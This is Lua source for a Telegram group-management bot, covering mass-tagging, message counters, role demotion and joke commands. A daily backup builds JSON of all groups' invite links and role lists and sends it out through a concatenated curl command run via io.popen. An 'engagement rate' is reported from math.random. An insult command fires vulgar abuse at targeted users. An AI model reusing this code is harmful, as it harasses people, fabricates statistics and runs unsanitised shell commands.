if not DevJoker:get(BlAcK..'Joker:Lock:TagAll'..msg.chat_id_) then
function TagAll(dp1,dp2)
local text = "᥀︙وينكم يالربع \n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n"
i = 0
for k, v in pairs(dp2.members_) do
i = i + 1
if DevJoker:get(BlAcK..'Save:UserName'..v.user_id_) then
text = text..i.."~ : [@"..DevJoker:get(BlAcK..'Save:UserName'..v.user_id_).."]\n"
else
text = text..i.."~ : "..v.user_id_.."\n"
end
end 
Dev_Joker(msg.chat_id_, msg.id_, 1, text, 1, 'md')
end
tdcli_function({ID = "GetChannelMembers",channel_id_ = getChatId(msg.chat_id_).ID, offset_ = 0,limit_ = 200000},TagAll,nil)
end
end
--     Source BlAcK     --
if text and text:match("^كللهم (.*)$") and ChCheck(msg) then
local txt = {string.match(text, "^(كللهم) (.*)$")}
if not DevJoker:get(BlAcK..'Joker:Lock:TagAll'..msg.chat_id_) then
function TagAll(dp1,dp2)
local text = "᥀︙"..txt[2].." \n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n"
i = 0
for k, v in pairs(dp2.members_) do
i = i + 1
if DevJoker:get(BlAcK..'Save:UserName'..v.user_id_) then
text = text..i.."~ : [@"..DevJoker:get(BlAcK..'Save:UserName'..v.user_id_).."]\n"
else
text = text..i.."~ : "..v.user_id_.."\n"
end
end 
Dev_Joker(msg.chat_id_, msg.id_, 1, text, 1, 'md')
end
tdcli_function({ID = "GetChannelMembers",channel_id_ = getChatId(msg.chat_id_).ID, offset_ = 0,limit_ = 200000},TagAll,nil)
end
end
end
--     Source BlAcK     --
if Manager(msg) then
if text == 'تفعيل ملف TagAll.lua' or text == 'تفعيل @all' or text == 'تفعيل all' or text == '↫ تفعيل all ᥀' then   
local BlAcKTeam = '᥀︙اهلا عزيزي ↫ '..JokerRank(msg)..' \n᥀︙تم تفعيل ملف تاك منفصل للأعضاء'
Jokermoned(msg.chat_id_, msg.sender_user_id_, msg.id_, BlAcKTeam, 14, string.len(msg.sender_user_id_))
DevJoker:del(BlAcK.."Joker:Lock:TagAll")
end
if text == 'تعطيل ملف TagAll.lua' or text == 'تعطيل @all' or text == 'تعطيل all' or text == '↫ تعطيل all ᥀' then   
local BlAcKTeam = '᥀︙اهلا عزيزي ↫ '..JokerRank(msg)..' \n᥀︙تم تعطيل ملف تاك منفصل للأعضاء'
Jokermoned(msg.chat_id_, msg.sender_user_id_, msg.id_, BlAcKTeam, 14, string.len(msg.sender_user_id_))
DevJoker:set(BlAcK.."Joker:Lock:TagAll",true) 
end 
if text and (text == "all" or text == "@all" or text == "#all") then
if (text and not DevJoker:get(BlAcK.."Joker:Lock:TagAll")) then
if DevJoker:get(BlAcK.."Joker:TagAll:Time"..msg.chat_id_..':'..msg.sender_user_id_) then  
Dev_Joker(msg.chat_id_, msg.id_, 1, '᥀︙انتظر دقيقه بعد ارسال الامر', 1, 'md')
return false  
end
DevJoker:setex(BlAcK..'Joker:TagAll:Time'..msg.chat_id_..':'..msg.sender_user_id_,300,true)
tdcli_function({ID="GetChannelFull",channel_id_ = msg.chat_id_:gsub('-100','')},function(arg,data) 
tdcli_function({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub('-100',''), offset_ = 0,limit_ = data.member_count_},function(arg,dp)
x = 0
tags = 0
local list = dp.members_
for k, v in pairs(list) do
tdcli_function({ID="GetUser",user_id_ = v.user_id_},function(extra,result,success)
if x == 5 or x == tags or k == 0 then
tags = x + 5
t = "#all"
end
x = x + 1
TagName = result.first_name_
TagName = TagName:gsub("]","")
TagName = TagName:gsub("[[]","")
t = t..", ["..TagName.."](tg://user?id="..v.user_id_..")"
if x == 1 or x == tags or k == 0 then
local Text = t:gsub('#all,','#all\n')
SendText(msg.chat_id_,Text,msg.id_/2097152/0.5,'md')
end
end,nil)
end
end,nil)
end,nil)
end
end
end
--     Source BlAcK     --
if Manager(msg) then
if text == 'تفعيل @admin' or text == 'تفعيل admin' or text == '↫ تفعيل admin ᥀' then   
local BlAcKTeam = '᥀︙اهلا عزيزي ↫ '..JokerRank(msg)..' \n᥀︙تم تفعيل ملف تاك منفصل للمشرفين'
Jokermoned(msg.chat_id_, msg.sender_user_id_, msg.id_, BlAcKTeam, 14, string.len(msg.sender_user_id_))
DevJoker:del(BlAcK.."Joker:Lock:TagAdmins")
end
if text == 'تعطيل @admin' or text == 'تعطيل admin' or text == '↫ تعطيل admin ᥀' then   
local BlAcKTeam = '᥀︙اهلا عزيزي ↫ '..JokerRank(msg)..' \n᥀︙تم تعطيل ملف تاك منفصل للمشرفين'
Jokermoned(msg.chat_id_, msg.sender_user_id_, msg.id_, BlAcKTeam, 14, string.len(msg.sender_user_id_))
DevJoker:set(BlAcK.."Joker:Lock:TagAdmins",true) 
end 
if text == "admin" or text == "@admin" or text == "#admin" then
if (text and not DevJoker:get(BlAcK.."Joker:Lock:TagAdmins")) then
if DevJoker:get(BlAcK.."Joker:TagAdmins:Time"..msg.chat_id_..':'..msg.sender_user_id_) then  
Dev_Joker(msg.chat_id_, msg.id_, 1, '᥀︙انتظر دقيقه بعد ارسال الامر', 1, 'md')
return false  
end
DevJoker:setex(BlAcK..'Joker:TagAdmins:Time'..msg.chat_id_..':'..msg.sender_user_id_,300,true)
tdcli_function ({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub("-100",""),filter_ = {ID = "ChannelMembersAdministrators"},offset_ = 0,limit_ = 100 },function(extra,result,success)
x = 0
tags = 0
local list = result.members_  
for k, v in pairs(list) do
tdcli_function({ID="GetUser",user_id_ = v.user_id_},function(arg,dp)
if x == 1 or x == tags or k == 0 then
tags = x + 5
t = "#Admins"
end
x = x + 1
TagName = dp.first_name_
TagName = TagName:gsub("]","")
TagName = TagName:gsub("[[]","")
t = t..", ["..TagName.."](tg://user?id="..v.user_id_..")"
if x == 1 or x == tags or k == 0 then
local Text = t:gsub('#Admins,','#Admins\n')
SendText(msg.chat_id_,Text,msg.id_/2097152/0.5,'md')
end
end,nil)
end
end,nil)
end
end
end
--     Source BlAcK     --
if (text and not DevJoker:get(BlAcK.."Joker:Lock:AutoFile")) then
Time = DevJoker:get(BlAcK.."Joker:AutoFile:Time")
if Time then 
if Time ~= os.date("%x") then 
local list = DevJoker:smembers(BlAcK..'Joker:Groups') 
local BotName = (DevJoker:get(BlAcK.."Joker:NameBot") or 'بلاك')
local GetJson = '{"BotId": '..BlAcK..',"BotName": "'..BotName..'","GroupsList":{'  
for k,v in pairs(list) do 
LinkGroups = DevJoker:get(BlAcK.."Joker:Groups:Links"..v)
Welcomes = DevJoker:get(BlAcK..'Joker:Groups:Welcomes'..v) or ''
JokerConstructors = DevJoker:smembers(BlAcK..'Joker:JokerConstructor:'..v)
BasicConstructors = DevJoker:smembers(BlAcK..'Joker:BasicConstructor:'..v)
Constructors = DevJoker:smembers(BlAcK..'Joker:Constructor:'..v)
Managers = DevJoker:smembers(BlAcK..'Joker:Managers:'..v)
Admis = DevJoker:smembers(BlAcK..'Joker:Admins:'..v)
Vips = DevJoker:smembers(BlAcK..'Joker:VipMem:'..v)
if k == 1 then
GetJson = GetJson..'"'..v..'":{'
else
GetJson = GetJson..',"'..v..'":{'
end
if #Vips ~= 0 then 
GetJson = GetJson..'"Vips":['
for k,v in pairs(Vips) do
if k == 1 then
GetJson =  GetJson..'"'..v..'"'
else
GetJson =  GetJson..',"'..v..'"'
end
end   
GetJson = GetJson..'],'
end
if #Admis ~= 0 then
GetJson = GetJson..'"Admis":['
for k,v in pairs(Admis) do
if k == 1 then
GetJson =  GetJson..'"'..v..'"'
else
GetJson =  GetJson..',"'..v..'"'
end
end   
GetJson = GetJson..'],'
end
if #Managers ~= 0 then
GetJson = GetJson..'"Managers":['
for k,v in pairs(Managers) do
if k == 1 then
GetJson =  GetJson..'"'..v..'"'
else
GetJson =  GetJson..',"'..v..'"'
end
end   
GetJson = GetJson..'],'
end
if #Constructors ~= 0 then
GetJson = GetJson..'"Constructors":['
for k,v in pairs(Constructors) do
if k == 1 then
GetJson =  GetJson..'"'..v..'"'
else
GetJson =  GetJson..',"'..v..'"'
end
end   
GetJson = GetJson..'],'
end
if #BasicConstructors ~= 0 then
GetJson = GetJson..'"BasicConstructors":['
for k,v in pairs(BasicConstructors) do
if k == 1 then
GetJson =  GetJson..'"'..v..'"'
else
GetJson =  GetJson..',"'..v..'"'
end
end   
GetJson = GetJson..'],'
end
if #JokerConstructors ~= 0 then
GetJson = GetJson..'"JokerConstructors":['
for k,v in pairs(JokerConstructors) do
if k == 1 then
GetJson =  GetJson..'"'..v..'"'
else
GetJson =  GetJson..',"'..v..'"'
end
end   
GetJson = GetJson..'],'
end
if LinkGroups then
GetJson = GetJson..'"LinkGroups":"'..LinkGroups..'",'
end
GetJson = GetJson..'"Welcomes":"'..Welcomes..'"}'
end
GetJson = GetJson..'}}'
local File = io.open('./'..BlAcK..'.json', "w")
File:write(GetJson)
File:close()
local Joker = 'https://api.telegram.org/bot' .. TokenBot .. '/sendDocument'
local curl = 'curl "' .. Joker .. '" -F "chat_id='..DevId..'" -F "document=@'..BlAcK..'.json' .. '" -F "caption=᥀︙نسخه تلقائيه تحتوي على ↫ '..#list..' مجموعه"'
io.popen(curl)
io.popen('fm -fr '..BlAcK..'.json')
DevJoker:set(BlAcK.."Joker:AutoFile:Time",os.date("%x"))
end
else 
DevJoker:set(BlAcK.."Joker:AutoFile:Time",os.date("%x"))
end
end
--     Source BlAcK     --
if text == "رسائلي" and msg.reply_to_message_id_ == 0 and ChCheck(msg) then
local user_msgs = DevJoker:get(BlAcK..'Joker:UsersMsgs'..msg.chat_id_..':'..msg.sender_user_id_)
Dev_Joker(msg.chat_id_, msg.id_, 1, "᥀︙عدد رسائلك هنا ↫ *❨ "..user_msgs.." ❩*", 1, 'md')
end
if text == "التفاعل" and ChCheck(msg) then
local EntryNumber = (DevJoker:get(BlAcK..'Joker:EntryNumber'..msg.chat_id_..':'..os.date('%d')) or 0)
local ExitNumber = (DevJoker:get(BlAcK..'Joker:ExitNumber'..msg.chat_id_..':'..os.date('%d')) or 0)
local MsgNumberDay = (DevJoker:get(BlAcK..'Joker:MsgNumberDay'..msg.chat_id_..':'..os.date('%d')) or 0)
Dev_Joker(msg.chat_id_, msg.id_, 1, "᥀︙انضمام الاعضاء اليوم ↫ *"..EntryNumber.."*\n᥀︙مغادرة الاعضاء اليوم ↫ *"..ExitNumber.."*\n᥀︙عدد الرسائل اليوم ↫ *"..MsgNumberDay.."*\n᥀︙نسبة التفاعل اليوم ↫ *"..math.random(40,100).."%*", 1, 'md')
end
--     Source BlAcK     --
if text == "تعطيل تفاعلي" and Manager(msg) and ChCheck(msg) then
local BlAcKTeam = '᥀︙اهلا عزيزي ↫ '..JokerRank(msg)..' \n᥀︙تم تعطيل تفاعلي'
Jokermoned(msg.chat_id_, msg.sender_user_id_, msg.id_, BlAcKTeam, 14, string.len(msg.sender_user_id_))
DevJoker:del(BlAcK..'Joker:msg:Joker'..msg.chat_id_) 
end
if text == "تفعيل تفاعلي" and Manager(msg) and ChCheck(msg) then
local BlAcKTeam = '᥀︙اهلا عزيزي ↫ '..JokerRank(msg)..' \n᥀︙تم تفعيل تفاعلي'
Jokermoned(msg.chat_id_, msg.sender_user_id_, msg.id_, BlAcKTeam, 14, string.len(msg.sender_user_id_))
DevJoker:set(BlAcK..'Joker:msg:Joker'..msg.chat_id_,true)  
end
if DevJoker:get(BlAcK.."Joker:msg:Joker"..msg.chat_id_) then
if msg.content_.ID then
get_msg = DevJoker:get(BlAcK.."Joker:msg:Joker"..msg.sender_user_id_..":"..msg.chat_id_) or 0
gms = get_msg + 1
DevJoker:setex(BlAcK..'Joker:msg:Joker'..msg.sender_user_id_..":"..msg.chat_id_,86400,gms)
end
if text == "تفاعلي" and tonumber(msg.reply_to_message_id_) == 0 then    
get_msg = DevJoker:get(BlAcK.."Joker:msg:Joker"..msg.sender_user_id_..":"..msg.chat_id_) or 0
send(msg.chat_id_, msg.id_,"᥀︙عدد رسائلك الكلي هو ↬\n"..get_msg.." من الرسائل")
end  
if text == "تفاعله" and tonumber(msg.reply_to_message_id_) > 0 then    
if tonumber(msg.reply_to_message_id_) ~= 0 then 
function prom_reply(extra, result, success) 
get_msg = DevJoker:get(BlAcK.."Joker:msg:Joker"..result.sender_user_id_..":"..msg.chat_id_) or 0
send(msg.chat_id_, msg.id_,"᥀︙عدد رسائله الكلي هو ↬\n"..get_msg.." من الرسائل")
end  
tdcli_function ({ID = "GetMessage",chat_id_=msg.chat_id_,message_id_=tonumber(msg.reply_to_message_id_)},prom_reply, nil)
end
end
end
--     Source BlAcK     --
if text == "جهاتي" and ChCheck(msg) or text == "اضافاتي" and ChCheck(msg) then add = (tonumber(DevJoker:get(BlAcK..'Joker:ContactNumber'..msg.chat_id_..':'..msg.sender_user_id_)) or 0) Dev_Joker(msg.chat_id_, msg.id_, 1, "᥀︙عدد جهاتك المضافه ↫ *❨ "..add.." ❩* ", 1, 'md') end
if text == "تعديلاتي" or text == "سحكاتي" and ChCheck(msg) then local edit_msg = DevJoker:get(BlAcK..'Joker:EditMsg'..msg.chat_id_..msg.sender_user_id_) or 0  Dev_Joker(msg.chat_id_, msg.id_, 1, "᥀︙عدد تعديلاتك ↫ *❨ "..edit_msg.." ❩* ", 1, 'md') end
if text == "رتبتي" and ChCheck(msg) then Dev_Joker(msg.chat_id_, msg.id_, 1, '᥀︙رتبتك ↫ '..IdRank(msg.sender_user_id_, msg.chat_id_), 1, 'html') end
if text == "ايدي المجموعه" and ChCheck(msg) then Dev_Joker(msg.chat_id_, msg.id_, 1, "᥀︙ايدي المجموعه ↫ `"..msg.chat_id_.."`", 1, 'md') end
if text == 'مسح سحكاتي' or text == 'مسح تعديلاتي' or text == 'حذف سحكاتي' or text == 'حذف تعديلاتي' then DevJoker:del(BlAcK..'Joker:EditMsg'..msg.chat_id_..msg.sender_user_id_) Dev_Joker(msg.chat_id_, msg.id_, 1, '᥀︙تم حذف جميع تعديلاتك بنجاح' , 1, 'md') end
if text == 'مسح جهاتي' or text == 'مسح اضافاتي' or text == 'حذف جهاتي' or text == 'حذف اضافاتي' then DevJoker:del(BlAcK..'Joker:ContactNumber'..msg.chat_id_..':'..msg.sender_user_id_) Dev_Joker(msg.chat_id_, msg.id_, 1, '᥀︙تم حذف جميع جهاتك المضافه' , 1, 'md') end
--     Source BlAcK     --
if text and text:match('^هينه @(.*)') and ChCheck(msg) or text and text:match('^هينها @(.*)') and ChCheck(msg) then 
if not DevJoker:get(BlAcK..'Joker:Lock:Stupid'..msg.chat_id_) then
local username = text:match('^هينه @(.*)') or text:match('^هينها @(.*)') 
function BlAcKTeam(extra,result,success)
if result.id_ then  
if tonumber(result.id_) == tonumber(BlAcK) then  
Dev_Joker(msg.chat_id_, msg.id_, 1, 'شو تمضرط اكو واحد يهين نفسه؟🤔👌🏿', 1, 'md')  
return false 
end  
if tonumber(result.id_) == tonumber(DevId) then 
Dev_Joker(msg.chat_id_, msg.id_, 1, 'دي لكك تريد اهينن تاج راسكك؟😏🖕🏿', 1, 'md') 
return false  
end  
if tonumber(result.id_) == tonumber(1765160742) then 
Dev_Joker(msg.chat_id_, msg.id_, 1, 'دي لكك تريد اهينن تاج راسكك؟😏🖕🏿', 1, 'md') 
return false  
end  
if DevJoker:sismember(BlAcK.."Joker:JokerConstructor:"..msg.chat_id_,result.id_) then
Dev_Joker(msg.chat_id_, msg.id_, 1, 'دي لكك تريد اهينن تاج راسكك؟😏🖕🏿', 1, 'md')
return false
end 
local BlAcKTeam = "صارر ستاذيي 🏃🏻‍♂️♥️" 
Dev_Joker(msg.chat_id_, msg.id_, 1,BlAcKTeam, 1, 'md') 
local BlAcKTeam = { "لكك جرجف @"..username.." احترم اسيادكك لا اكتلكك وازربب على كبركك،💩🖐🏿","هشش لكك فاشل @"..username.." لتضل تمسلت لا اخربط تضاريس وجهك جنه ابط عبده، 😖👌🏿","حبيبي @"..username.." راح احاول احترمكك هالمره بلكي تبطل حيونه، 🤔🔪","دمشي لك @"..username.." ينبوع الفشل مو زين ملفيك ونحجي وياك هي منبوذ 😏🖕🏿","ها الغليض التفس ابو راس المربع @"..username.." متعلملك جم حجايه وجاي تطكطكهن علينه دبطل😒🔪",}
Dev_Joker(msg.chat_id_, result.id_, 1,''..BlAcKTeam[math.random(#BlAcKTeam)], 1, 'html') 
else  
Dev_Joker(msg.chat_id_, msg.id_, 1, '᥀︙العضو غير موجود في المجموعه', 1, 'md') 
end 
end 
resolve_username(username,BlAcKTeam)
end
end
--     Source BlAcK     --
if text == ("هينه") or text == ("بعد هينه") or text == ("هينه بعد") or text == ("لك هينه") or text == ("هينها") or text == ("هينهه") or text == ("رزله") or text == ("رزلهه") or text == ("رزلها") then
if not DevJoker:get(BlAcK..'Joker:Lock:Stupid'..msg.chat_id_) then
function hena(extra, result, success)
if tonumber(result.sender_user_id_) == tonumber(BlAcK) then 
Dev_Joker(msg.chat_id_, msg.id_, 1, 'شو تمضرط اكو واحد يهين نفسه؟🤔👌🏿', 1, 'md') 
return false  
end  
if tonumber(result.sender_user_id_) == tonumber(DevId) then  
Dev_Joker(msg.chat_id_, msg.id_, 1, 'دي لكك تريد اهينن تاج راسكك؟😏🖕🏿', 1, 'md')
return false
end 
if tonumber(result.sender_user_id_) == tonumber(1765160742) then  
Dev_Joker(msg.chat_id_, msg.id_, 1, 'دي لكك تريد اهينن تاج راسكك؟😏🖕🏿', 1, 'md')
return false
end 
if DevJoker:sismember(BlAcK.."Joker:JokerConstructor:"..msg.chat_id_,result.sender_user_id_) then
Dev_Joker(msg.chat_id_, msg.id_, 1, 'دي لكك تريد اهينن تاج راسكك؟😏🖕🏿', 1, 'md')
return false
end 
local BlAcKTeam = "صارر ستاذيي 🏃🏻‍♂️♥️" 
Dev_Joker(msg.chat_id_, msg.id_, 1,BlAcKTeam, 1, 'md') 
local BlAcKTeam = {"لكك جرجف احترم اسيادكك لا اكتلكك وازربب على كبركك،💩🖐🏿","هشش فاشل لتضل تمسلت لا اخربط تضاريس وجهك جنه ابط عبده، 😖👌🏿","دمشي لك ينبوع الفشل مو زين ملفيك ونحجي وياك هي منبوذ 😏🖕🏿","ها الغليض التفس ابو راس المربع متعلملك جم حجايه وجاي تطكطكهن علينه دبطل😒🔪","حبيبي راح احاول احترمكك هالمره بلكي تبطل حيونه، 🤔🔪"} 
Dev_Joker(msg.chat_id_, result.id_, 1,''..BlAcKTeam[math.random(#BlAcKTeam)], 1, 'md') 
end 
if tonumber(msg.reply_to_message_id_) == 0 then
else 
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),hena)   
end
end
end
if text == ("بوسه") or text == ("بعد بوسه") or text == ("ضل بوس") or text == ("بوسه بعد") or text == ("بوسها") or text == ("بعد بوسها") or text == ("ضل بوس") or text == ("بوسها بعد") or text == ("بوسهه") then
if not DevJoker:get(BlAcK..'Joker:Lock:Stupid'..msg.chat_id_) then
function bosh(extra, result, success)
if tonumber(result.sender_user_id_) == tonumber(BlAcK) then 
Dev_Joker(msg.chat_id_, msg.id_, 1, 'فهمنيي شلوون راحح ابوس نفسيي؟😶💔', 1, 'md') 
return false  
end  
if tonumber(result.sender_user_id_) == tonumber(DevId) then  
Dev_Joker(msg.chat_id_, result.id_, 1, 'مواححح احلاا بوسةة المطوريي😻🔥💗', 1, 'html')
return false
end 
local BlAcKTeam = "صارر ستاذيي 🏃🏻‍♂️♥️" 
Dev_Joker(msg.chat_id_, msg.id_, 1,BlAcKTeam, 1, 'md') 
local BlAcKTeam = {"مواححح افيش عافيههه😍🔥💗","امممووااهحح شهلعسل🥺🍯💘","مواححح،ءوفف اذوب🤤💗"} 
Dev_Joker(msg.chat_id_, result.id_, 1,''..BlAcKTeam[math.random(#BlAcKTeam)], 1, 'md') 
end 
if tonumber(msg.reply_to_message_id_) == 0 then
else 
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),bosh)   
end
end
end
if text == ("صيحه") or text == ("صيحها") or text == ("صيحهه") or text == ("صيح") then
if not DevJoker:get(BlAcK..'Joker:Lock:Stupid'..msg.chat_id_) then
function seha(extra, result, success)
if tonumber(result.sender_user_id_) == tonumber(BlAcK) then 
Dev_Joker(msg.chat_id_, msg.id_, 1, 'فهمنيي شلوون راحح اصيح نفسيي؟😶💔', 1, 'md') 
return false  
end  
if tonumber(result.sender_user_id_) == tonumber(DevId) then  
Dev_Joker(msg.chat_id_, result.id_, 1, 'تعال مطوريي محتاجيكك🏃🏻‍♂️♥️', 1, 'html')
return false
end 
local BlAcKTeam = "صارر ستاذيي 🏃🏻‍♂️♥️" 
Dev_Joker(msg.chat_id_, msg.id_, 1,BlAcKTeam, 1, 'md') 
local BlAcKTeam = {"تتعال ححب محتاجيك🙂🍭","تعال يولل استاذكك ايريدككك😒🔪","يمعوود تعاال يريدوكك🤕♥️","تعال لكك ديصيحوك😐🖤"} 
Dev_Joker(msg.chat_id_, result.id_, 1,''..BlAcKTeam[math.random(#BlAcKTeam)], 1, 'md') 
end 
if tonumber(msg.reply_to_message_id_) == 0 then
else 
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),seha)   
end
end
end
--     Source BlAcK     --
if text and text:match('^صيحه @(.*)') and ChCheck(msg) or text and text:match('^صيح @(.*)') and ChCheck(msg) then 
if not DevJoker:get(BlAcK..'Joker:Lock:Stupid'..msg.chat_id_) then
local username = text:match('^صيحه @(.*)') or text:match('^صيح @(.*)') 
function BlAcKTeam(extra,result,success)
if result.id_ then  
if tonumber(result.id_) == tonumber(BlAcK) then  
Dev_Joker(msg.chat_id_, msg.id_, 1, 'فهمنيي شلوون راحح اصيح نفسيي؟😶💔', 1, 'md')  
return false 
end  
if tonumber(result.id_) == tonumber(DevId) then 
Dev_Joker(msg.chat_id_, msg.id_, 1, 'تعال مطوريي محتاجيكك🏃🏻‍♂️♥️ @'..username, 1, 'html') 
return false  
end  
local BlAcKTeam = "صارر ستاذيي 🏃🏻‍♂️♥️" 
Dev_Joker(msg.chat_id_, msg.id_, 1,BlAcKTeam, 1, 'md') 
local BlAcKTeam = { "تتعال ححب @"..username.." محتاجيك🙂🍭","تعال يولل @"..username.." استاذكك ايريدككك😒🔪","يمعوود @"..username.." تعاال يريدوكك🤕♥️","تعال لكك @"..username.." ديصيحوك😐🖤",}
Dev_Joker(msg.chat_id_, result.id_, 1,''..BlAcKTeam[math.random(#BlAcKTeam)], 1, 'html') 
else  
Dev_Joker(msg.chat_id_, msg.id_, 1, '᥀︙العضو غير موجود في المجموعه', 1, 'md') 
end 
end 
resolve_username(username,BlAcKTeam)
end
end
end
--     Source BlAcK     --
if text == ("تنزيل الكل") and msg.reply_to_message_id_ ~= 0 and Manager(msg) and ChCheck(msg) then 
function promote_by_reply(extra, result, success)
if SudoId(result.sender_user_id_) == true then
Dev_Joker(msg.chat_id_, msg.id_, 1, "᥀︙لاتستطيع تنزيل المطور الاساسي", 1, 'md')
return false 
end
if DevJoker:sismember(BlAcK..'Joker:JokerSudo:',result.sender_user_id_) then
Jokersudo = 'المطورين الاساسيين • ' else Jokersudo = '' end
if DevJoker:sismember(BlAcK..'Joker:SecondSudo:',result.sender_user_id_) then
secondsudo = 'المطورين الثانويين • ' else secondsudo = '' end
if DevJoker:sismember(BlAcK..'Joker:SudoBot:',result.sender_user_id_) then
sudobot = 'المطورين • ' else sudobot = '' end
if DevJoker:sismember(BlAcK..'Joker:BasicConstructor:'..msg.chat_id_, result.sender_user_id_) then
basicconstructor = 'المنشئين الاساسيين • ' else basicconstructor = '' end
if DevJoker:sismember(BlAcK..'Joker:Constructor:'..msg.chat_id_, result.sender_user_id_) then
constructor = 'المنشئين • ' else constructor = '' end 
if DevJoker:sismember(BlAcK..'Joker:Managers:'..msg.chat_id_, result.sender_user_id_) then
manager = 'المدراء • ' else manager = '' end
if DevJoker:sismember(BlAcK..'Joker:Admins:'..msg.chat_id_, result.sender_user_id_) then
admins = 'الادمنيه • ' else admins = '' end
if DevJoker:sismember(BlAcK..'Joker:VipMem:'..msg.chat_id_, result.sender_user_id_) then
vipmem = 'المميزين • ' else vipmem = '' end
if DevJoker:sismember(BlAcK..'Joker:Cleaner:'..msg.chat_id_, result.sender_user_id_) then
cleaner = 'المنظفين • ' else cleaner = ''
end
if RankChecking(result.sender_user_id_,msg.chat_id_) ~= false then
ReplyStatus(msg,result.sender_user_id_,"Reply","᥀︙تم تنزيله من ↫ ⤈\n~ ( "..Jokersudo..secondsudo..sudobot..basicconstructor..constructor..manager..admins..vipmem..cleaner.." ) ~")  
else 
ReplyStatus(msg,result.sender_user_id_,"Reply","᥀︙لم تتم ترقيته مسبقا")  
end
if JokerDelAll(msg.sender_user_id_,msg.chat_id_) == 'sudoid' then
DevJoker:srem(BlAcK..'Joker:JokerSudo:', result.sender_user_id_)
DevJoker:srem(BlAcK..'Joker:SecondSudo:', result.sender_user_id_)
DevJoker:srem(BlAcK..'Joker:SudoBot:', result.sender_user_id_)
DevJoker:srem(BlAcK..'Joker:BasicConstructor:'..msg.chat_id_,result.sender_user_id_)
DevJoker:srem(BlAcK..'Joker:Constructor:'..msg.chat_id_,result.sender_user_id_)
DevJoker:srem(BlAcK..'Joker:Managers:'..msg.chat_id_, result.sender_user_id_)
DevJoker:srem(BlAcK..'Joker:Admins:'..msg.chat_id_, result.sender_user_id_)
DevJoker:srem(BlAcK..'Joker:VipMem:'..msg.chat_id_, result.sender_user_id_)
DevJoker:srem(BlAcK..'Joker:Cleaner:'..msg.chat_id_, result.sender_user_id_)
elseif JokerDelAll(msg.sender_user_id_,msg.chat_id_) == 'Jokersudo' then
DevJoker:srem(BlAcK..'Joker:SecondSudo:', result.sender_user_id_)
DevJoker:srem(BlAcK..'Joker:SudoBot:', result.sender_user_id_)
DevJoker:srem(BlAcK..'Joker:BasicConstructor:'..msg.chat_id_,result.sender_user_id_)
DevJoker:srem(BlAcK..'Joker:Constructor:'..msg.chat_id_,result.sender_user_id_)
DevJoker:srem(BlAcK..'Joker:Managers:'..msg.chat_id_, result.sender_user_id_)
DevJoker:srem(BlAcK..'Joker:Admins:'..msg.chat_id_, result.sender_user_id_)
DevJoker:srem(BlAcK..'Joker:VipMem:'..msg.chat_id_, result.sender_user_id_)
DevJoker:srem(BlAcK..'Joker:Cleaner:'..msg.chat_id_, result.sender_user_id_)
elseif JokerDelAll(msg.sender_user_id_,msg.chat_id_) == 'secondsudo' then
DevJoker:srem(BlAcK..'Joker:SudoBot:', result.sender_user_id_)
DevJoker:srem(BlAcK..'Joker:BasicConstructor:'..msg.chat_id_,result.sender_user_id_)
DevJoker:srem(BlAcK..'Joker:Constructor:'..msg.chat_id_,result.sender_user_id_)
DevJoker:srem(BlAcK..'Joker:Managers:'..msg.chat_id_, result.sender_user_id_)
DevJoker:srem(BlAcK..'Joker:Admins:'..msg.chat_id_, result.sender_user_id_)
DevJoker:srem(BlAcK..'Joker:VipMem:'..msg.chat_id_, result.sender_user_id_)
DevJoker:srem(BlAcK..'Joker:Cleaner:'..msg.chat_id_, result.sender_user_id_)
elseif JokerDelAll(msg.sender_user_id_,msg.chat_id_) == 'sudobot' then
DevJoker:srem(BlAcK..'Joker:Admins:'..msg.chat_id_, result.sender_user_id_)
DevJoker:srem(BlAcK..'Joker:VipMem:'..msg.chat_id_, result.sender_user_id_)
DevJoker:srem(BlAcK..'Joker:Managers:'..msg.chat_id_, result.sender_user_id_)
DevJoker:srem(BlAcK..'Joker:Constructor:'..msg.chat_id_,result.sender_user_id_)
DevJoker:srem(BlAcK..'Joker:BasicConstructor:'..msg.chat_id_,result.sender_user_id_)
elseif JokerDelAll(msg.sender_user_id_,msg.chat_id_) == 'Jokerconstructor' then
DevJoker:srem(BlAcK..'Joker:Admins:'..msg.chat_id_, result.sender_user_id_)
DevJoker:srem(BlAcK..'Joker:VipMem:'..msg.chat_id_, result.sender_user_id_)
DevJoker:srem(BlAcK..'Joker:Managers:'..msg.chat_id_, result.sender_user_id_)
DevJoker:srem(BlAcK..'Joker:Constructor:'..msg.chat_id_,result.sender_user_id_)
DevJoker:srem(BlAcK..'Joker:BasicConstructor:'..msg.chat_id_,result.sender_user_id_)
DevJoker:srem(BlAcK..'Joker:Cleaner:'..msg.chat_id_, result.sender_user_id_)
elseif JokerDelAll(msg.sender_user_id_,msg.chat_id_) == 'basicconstructor' then
DevJoker:srem(BlAcK..'Joker:Admins:'..msg.chat_id_, result.sender_user_id_)
DevJoker:srem(BlAcK..'Joker:VipMem:'..msg.chat_id_, result.sender_user_id_)
DevJoker:srem(BlAcK..'Joker:Managers:'..msg.chat_id_, result.sender_user_id_)
DevJoker:srem(BlAcK..'Joker:Constructor:'..msg.chat_id_,result.sender_user_id_)
DevJoker:srem(BlAcK..'Joker:Cleaner:'..msg.chat_id_, result.sender_user_id_)
elseif JokerDelAll(msg.sender_user_id_,msg.chat_id_) == 'constructor' then
DevJoker:srem(BlAcK..'Joker:Admins:'..msg.chat_id_, result.sender_user_id_)
DevJoker:srem(BlAcK..'Joker:VipMem:'..msg.chat_id_, result.sender_user_id_)
DevJoker:srem(BlAcK..'Joker:Managers:'..msg.chat_id_, result.sender_user_id_)
DevJoker:srem(BlAcK..'Joker:Cleaner:'..msg.chat_id_, result.sender_user_id_)
elseif JokerDelAll(msg.sender_user_id_,msg.chat_id_) == 'manager' then
DevJoker:srem(BlAcK..'Joker:Admins:'..msg.chat_id_, result.sender_user_id_)
DevJoker:srem(BlAcK..'Joker:VipMem:'..msg.chat_id_, result.sender_user_id_)
end
end
getMessage(msg.chat_id_, msg.reply_to_message_id_,promote_by_reply)
end
if text and text:match("^تنزيل الكل @(.*)$") and Manager(msg) and ChCheck(msg) then
